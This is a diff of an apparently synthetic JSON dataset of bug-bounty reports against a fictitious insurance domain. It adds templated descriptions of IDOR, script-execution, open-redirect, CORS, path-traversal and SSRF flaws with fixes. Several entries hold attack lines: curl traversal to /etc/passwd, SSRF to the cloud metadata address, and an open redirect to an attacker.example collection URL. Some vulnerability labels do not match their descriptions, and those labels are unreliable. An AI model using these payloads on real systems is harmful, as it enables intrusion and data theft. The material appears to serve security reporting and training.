+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19452,7 +19598,8 @@
           "offset": "5d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19579,7 +19726,8 @@
           "offset": "4d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19723,7 +19871,8 @@
           "offset": "1d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19879,7 +20028,8 @@
           "offset": "2d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.silberkamm-insurance.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20031,7 +20181,8 @@
           "offset": "5d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20171,7 +20322,8 @@
           "offset": "8d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20287,7 +20439,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20442,7 +20595,8 @@
           "offset": "7d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.silberkamm-insurance.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20565,7 +20719,8 @@
           "offset": "1d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20689,7 +20844,8 @@
           "offset": "22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.silberkamm-insurance.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20804,7 +20960,8 @@
           "offset": "3d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20952,7 +21109,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21103,7 +21261,8 @@
           "offset": "7d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21251,7 +21410,8 @@
           "offset": "4d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21345,7 +21505,8 @@
           "offset": "1d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21463,7 +21624,8 @@
           "offset": "1d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21574,7 +21736,8 @@
           "offset": "1d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21710,7 +21873,8 @@
           "offset": "6d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.silberkamm-insurance.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21792,7 +21956,8 @@
           "offset": "2d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21919,7 +22084,8 @@
           "offset": "3d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.silberkamm-insurance.foo/import`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22054,7 +22220,8 @@
           "offset": "5d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22169,7 +22336,8 @@
           "offset": "3d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22296,7 +22464,8 @@
           "offset": "8d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.silberkamm-insurance.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22370,7 +22539,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.silberkamm-insurance.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22530,7 +22700,8 @@
           "offset": "3d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.silberkamm-insurance.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22624,7 +22795,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22746,7 +22918,8 @@
           "offset": "2d 8h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22869,7 +23042,8 @@
           "offset": "4d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.silberkamm-insurance.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23036,7 +23210,8 @@
           "offset": "5d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.silberkamm-insurance.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23175,7 +23350,8 @@
           "offset": "6d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.silberkamm-insurance.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23314,7 +23490,8 @@
           "offset": "1d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
